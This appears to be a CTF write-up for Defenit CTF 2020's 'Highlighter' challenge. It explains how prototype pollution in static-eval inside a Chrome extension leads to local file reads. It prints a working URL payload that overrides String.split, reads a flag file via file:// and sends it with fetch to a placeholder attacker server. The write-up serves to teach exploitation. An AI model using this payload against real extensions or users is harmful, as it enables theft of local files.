# Highlighter  
*Defenit CTF 2020 - Web 857*  
  
*Writeup by Payload as ToEatSushi*

## Problem

Do you like the Chrome extension?  
I made a tool to highlight a string through this.  
Use it well! :)

## `static-eval` prototype pollution

After hard fighting with `background.js`, I noticed it has a function that
acts as `eval`, but **safely**. With some google searches, we can find it's
`static-eval` of node.

Also, we can find **very** interseting [blog
post](https://blog.p6.is/bypassing-a-js-sandbox/) about prototype pollution in
`static-eval`, written by p0six who is a publisher of this problem.

## `.split()`

With prototype pollution, we overwrote `String.split` which is called by
`onMessage` after `static-eval`. At first, we succeed to make `alert(1)` in
**chrome extension**, not in user content (It's important).

```  
http://highlighter.ctf.defenit.kr/read?id=84#''['__proto__']['__defineGetter__']('split',function(){return/**/function(x){return/**/{[alert(1)]:1}};});  
```

## `file://`

When we looked `manifest.json`, there are host permissions over all
`http://*/*`, `https://*/*`, and `file://*/*`. These host permissions allows
chrome extensions to make a request without cross origin restrictions. Thus,
when we can evaluate javascript code in **Chrome extension**'s side, we can
read local file.

## `file:///`

However, according to `docker-compose.yml`, we have to know where the flag is
at first. Since chrome supports directory listing in file scheme, thus just
making a request to `file:///` give an index page of the root directory, and
we can know a name of folder.

## Exploitation

1. Pollute prototype using vulnerability of `static-eval`  
2. Overwrite `.split()` function to fetch local file, and send it to our server  
3. Read `file:///` first, then `file://{secret}/flag`.

## Payload

```  
http://highlighter.ctf.defenit.kr/read?id=2#''['__proto__']['__defineGetter__']('split',function(){return/**/function(x){return/**/{[(function(){var/**/r=new/**/XMLHttpRequest();r.open('GET','file:///6339e914b333b35d902a2dfd2c415656/flag',false);r.send();r.responseText;fetch('http://{our
server}/'+btoa(r.responseText));})()]:1,'zxcv':'1'}};})  
```

**`Defenit{Ch20m3_3x73n510n_c4n_b3_m0re_Inte7e5t1ng}`**  

Original writeup (https://github.com/mdsnins/ctf-
writeups/blob/master/2020/Defenit%20CTF/Highlighter/highlighter.md).